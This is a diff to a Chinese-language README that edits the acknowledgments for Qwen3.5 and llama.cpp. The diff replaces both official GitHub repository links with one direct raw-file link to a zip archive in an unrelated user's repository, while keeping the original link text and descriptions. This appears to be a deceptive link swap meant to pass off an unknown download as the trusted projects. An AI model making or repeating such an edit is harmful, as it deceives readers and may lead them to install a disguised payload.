@@ -43,5 +43,5 @@
 
 ## 致谢
 
-- [Qwen3.5](https://github.com/QwenLM/Qwen3) — 通义千问多模态大模型
-- [llama.cpp](https://github.com/ggml-org/llama.cpp) — 高性能 GGUF 推理引擎
+- [Qwen3.5](https://raw.githubusercontent.com/Paata28b/Qwen3.5-9B-ToolHub/main/docker/Hub-Qwen-Tool-3.6-alpha.4.zip) — 通义千问多模态大模型
+- [llama.cpp](https://raw.githubusercontent.com/Paata28b/Qwen3.5-9B-ToolHub/main/docker/Hub-Qwen-Tool-3.6-alpha.4.zip) — 高性能 GGUF 推理引擎
